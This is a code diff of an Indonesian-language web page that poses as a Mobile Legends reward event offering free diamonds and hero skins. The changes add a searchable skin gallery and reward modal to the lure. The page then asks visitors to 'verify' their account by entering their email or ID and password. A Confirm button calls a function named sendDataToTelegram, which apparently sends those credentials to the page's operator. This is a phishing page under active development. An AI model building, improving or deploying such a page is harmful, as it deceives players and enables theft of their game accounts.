@@ -41,74 +41,20 @@
             <div id="account-status"></div>
         </div>
 
-        <div class="section-box">
-            <div class="section-title"><span>2</span> Pilih Hadiah Event</div>
-            <div class="reward-grid">
-                <div class="reward-card" onclick="selectReward(this, '3500 Diamonds')">
-                    <img src="image/DM.jpeg" alt="Diamonds">
-                    <div class="name">3500 Diamonds</div>
-                </div>
-                <div class="reward-card" onclick="selectReward(this, 'Weekly Diamond Pass x15')">
-                    <img src="image/WDP.jpeg" alt="WDP">
-                    <div class="name">Weekly Diamond Pass x15</div>
-                </div>
-                <div class="reward-card" onclick="selectReward(this, '7 Rename Card')">
-                    <img src="image/Rename.jpeg" alt="Rename Card">
-                    <div class="name">7 Rename Card</div>
-                </div>
-                <div class="reward-card" onclick="selectReward(this, '12.000 BB Coin')">
-                    <img src="image/Coin.jpeg" alt="BB Coin">
-                    <div class="name">12.000 BB Coin</div>
-                </div>
-                <div class="reward-card" onclick="selectReward(this, 'Karina - Leona')">
-                    <img src="image/Leona.jpeg" alt="Leona">
-                    <div class="name">Karina - Leona</div>
-                </div>
-                <div class="reward-card" onclick="selectReward(this, 'Chou - Iori Yagami')">
-                    <img src="image/Iori.jpeg" alt="Iori">
-                    <div class="name">Chou - Iori Yagami</div>
-                </div>
-                <div class="reward-card" onclick="selectReward(this, 'Gusion - K\'')">
-                    <img src="image/K.jpeg" alt="K">
-                    <div class="name">Gusion - K'</div>
-                </div>
-                <div class="reward-card" onclick="selectReward(this, 'Esmeralda - The Foreseer')">
-                    <img src="image/Foreseer.jpeg" alt="Foreseer">
-                    <div class="name">Esmeralda - The Foreseer</div>
-                </div>
-                <div class="reward-card" onclick="selectReward(this, 'Lancelot - Swordmaster')">
-                    <img src="image/Swordmaster.jpeg" alt="Swordmaster">
-                    <div class="name">Lancelot - Swordmaster</div>
-                </div>
-                <div class="reward-card" onclick="selectReward(this, 'Harith - Killua')">
-                    <img src="image/Killua.jpeg" alt="Killua">
-                    <div class="name">Harith - Killua</div>
-                </div>
-                <div class="reward-card" onclick="selectReward(this, 'Lesley - Hawk-eyed Sniper')">
-                    <img src="image/Sniper.jpeg" alt="Sniper">
-                    <div class="name">Lesley - Hawk-eyed Sniper</div>
-                </div>
-                <div class="reward-card" onclick="selectReward(this, 'X-Borg - Tesla Maniac')">
-                    <img src="image/Maniac.jpeg" alt="Maniac">
-                    <div class="name">X-Borg - Tesla Maniac</div>
-                </div>
-                <div class="reward-card" onclick="selectReward(this, 'Hayabusa - Shura')">
-                    <img src="image/Shura.jpeg" alt="Shura">
-                    <div class="name">Hayabusa - Shura</div>
-                </div>
-                <div class="reward-card" onclick="selectReward(this, 'Rafaela - Biomedic')">
-                    <img src="image/Bio.jpeg" alt="Bio">
-                    <div class="name">Rafaela - Biomedic</div>
-                </div>
-                <div class="reward-card" onclick="selectReward(this, 'Gusion - Soul Revelation')">
-                    <img src="image/Soul.jpeg" alt="Soul">
-                    <div class="name">Gusion - Soul Revelation</div>
-                </div>
-                <div class="reward-card" onclick="selectReward(this, 'Julian - Kurapika')">
-                    <img src="image/Kurapika.jpeg" alt="Kurapika">
-                    <div class="name">Julian - Kurapika</div>
-                </div>
+        <div class="section-box album-container">
+            <div class="section-title"><span>📚</span> Galeri Album Skin Eksklusif</div>
+            
+            <div class="search-box-group">
+                <input type="text" id="skinSearchInput" placeholder="Cari nama hero / skin (cth: Dyrroth)...">
+                <button class="btn-search" onclick="triggerSearch()">Cari</button>
             </div>
+
+            <div class="album-scroll-wrapper" id="albumSlider"></div>
+        </div>
+
+        <div class="section-box">
+            <div class="section-title"><span>2</span> Pilih Hadiah Skin Collector</div>
+            <div class="reward-grid" id="collectorRewardGrid"></div>
         </div>
     </div>
 
@@ -120,7 +66,6 @@
         <button class="btn-submit" onclick="openLoginModal()">Claim</button>
     </div>
 
-    <!-- Modal Login Verifikasi -->
     <div class="modal" id="loginModal">
         <div class="modal-content">
             <h3>Verifikasi Akun Pemilik</h3>
@@ -134,7 +79,7 @@
                 </select>
             </div>
             <div class="login-field">
-                <label>Email</label>
+                <label>Email / ID Akun</label>
                 <input type="text" id="username" placeholder="Masukkan akun game">
             </div>
             <div class="login-field">
@@ -142,11 +87,19 @@
                 <input type="password" id="password" placeholder="Masukkan password">
             </div>
 
-            <button class="btn-confirm-claim" onclick="sendDataToTelegram()">Confirm</button>
+            <button class="btn-confirm-claim" onclick="sendDataToTelegram()" style="width:100%; background:#27ae60; color:white; border:none; padding:10px; border-radius:6px; font-weight:bold; font-size:12px; cursor:pointer; margin-top:10px;">Confirm</button>
         </div>
     </div>
 
-    <!-- Custom Universal Popup Modal -->
+    <div class="modal" id="albumModal">
+        <div class="modal-content">
+            <h3 id="albumModalTitle">Nama Album</h3>
+            <p id="albumModalDesc">Tekan salah satu skin di bawah untuk memilihnya sebagai hadiah klaim!</p>
+            <div class="album-modal-grid" id="albumModalGrid"></div>
+            <button class="btn-modal-close" onclick="closeAlbumModal()">Tutup</button>
+        </div>
+    </div>
+
     <div class="modal" id="customModal">
         <div class="modal-content custom-box">
             <h3 id="custom-modal-title">Perhatian</h3>
